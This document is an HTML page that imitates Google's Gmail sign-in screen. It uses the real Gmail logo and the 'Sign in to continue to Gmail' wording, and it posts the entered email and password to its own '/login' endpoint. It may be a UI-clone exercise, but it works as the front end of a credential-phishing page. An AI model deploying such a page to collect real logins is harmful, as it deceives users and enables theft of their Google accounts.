<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail Login Form</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #f1f3f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-box {
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0px 4px 16px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 360px;
            text-align: center;
        }

        .logo img {
            width: 75px;
            margin-bottom: 20px;
        }

        h2 {
            font-size: 24px;
            margin-bottom: 8px;
        }

        p {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 24px;
        }

        .input-group {
            margin-bottom: 16px;
            text-align: left;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            margin-bottom: 12px;
            outline: none;
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: #1a73e8;
        }

        .forgot-password {
            margin-bottom: 24px;
            text-align: right;
        }

        .forgot-password a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
        }

        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .create-account {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
        }

        .next {
            background-color: #1a73e8;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
        }

        footer {
            margin-top: 40px;
            font-size: 12px;
            color: #5f6368;
        }

        footer ul {
            display: flex;
            justify-content: center;
            list-style: none;
        }

        footer ul li {
            margin: 0 10px;
        }

        footer ul li a {
            color: #5f6368;
            text-decoration: none;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            body {
                padding: 10px;
            }

            .login-box {
                width: 100%;
                padding: 20px;
            }

            .logo img {
                width: 60px;
            }
        }

        @media (max-width: 480px) {
            h2 {
                font-size: 20px;
            }

            .next {
                padding: 8px 16px;
                font-size: 13px;
            }
        }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">
            <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r2.png" alt="Google Logo">
        </div>
        <h2>Sign in</h2>
        <p>to continue to Gmail</p>
        <form action="/login" method="POST">
            <div class="input-group">
                <input type="email" name="email" placeholder="Email or phone" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>
            <div class="forgot-password">
                <a href="#">Forgot password?</a>
            </div>
            <div class="buttons">
                <a href="#" class="create-account">Create account</a>
                <button type="submit" class="next">Next</button>
            </div>
        </form>
    </div>
    <footer>
        
    </footer>
</body>
</html>
